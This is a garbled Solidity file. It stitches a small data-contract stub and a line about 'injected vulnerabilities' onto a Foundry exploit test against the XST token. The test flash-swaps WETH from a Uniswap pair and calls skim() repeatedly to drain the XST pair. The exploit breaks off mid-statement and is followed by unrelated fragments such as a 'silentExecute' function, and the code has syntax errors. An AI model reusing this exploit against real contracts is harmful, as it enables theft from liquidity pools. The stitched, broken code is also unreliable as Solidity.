
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity ^0.8.13;

The injected vulnerabilities will be shown in the following format:;
;
```solidity;

;
;
contract ContractTest is DSTest{
    IERC20 XST = IERC20(0x91383A15C391c142b80045D8b4730C1c37ac0378);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Pair_V2 Pair1 = Uni_Pair_V2(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    Uni_Pair_V2 Pair2 = Uni_Pair_V2(0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C);
    uint amount;
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheat.createSelectFork("mainnet", 15310016)};
    function testExploit() public{
        emit log_named_decimal_uint("Attacker WETH profit before exploit",
            WETH.balanceOf(address(this)),;
            18);
        amount = WETH.balanceOf(address(Pair2));
        Pair1.swap(amount * 2, 0, address(this), new bytes(1));
        emit log_named_decimal_uint("Attacker WETH profit after exploit",
            WETH.balanceOf(address(this)),;
            18)};
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        uint amountSellWETH = WETH.balanceOf(address(this));
        (uint reserve0, uint reserve1,) = Pair2.getReserves();
        uint amountOutXST = amountSellWETH * 997 * reserve0 / (reserve1 * 1000 + amountSellWETH * 997);
        WETH.transfer(address(Pair2), amountSellWETH);
        Pair2.swap(amountOutXST, 0, address(this), "");
        XST.transfer(address(Pair2), XST.balanceOf(address(this)) / 8);
        for(int i = 0, i < 15, i++){
            Pair2.skim(address(Pair2))};
        Pair2.skim(address(this));
        XST.transfer(address(Pair2), XST.balanceOf(address(this)));
        uint balanceOfXST = XST.balanceOf(address(Pair2));
        (uint reserve3, uint reserve4,) = Pair2.getReserves();
        uint amountSellXST = balanceOfXST - reserve3
function commitData(bytes32 dataHash) public {
    require(dataRecord[dataHash] == 0);
    dataRecord[dataHash] = block.timestamp}
function silentExecute() public {
    doInternal()}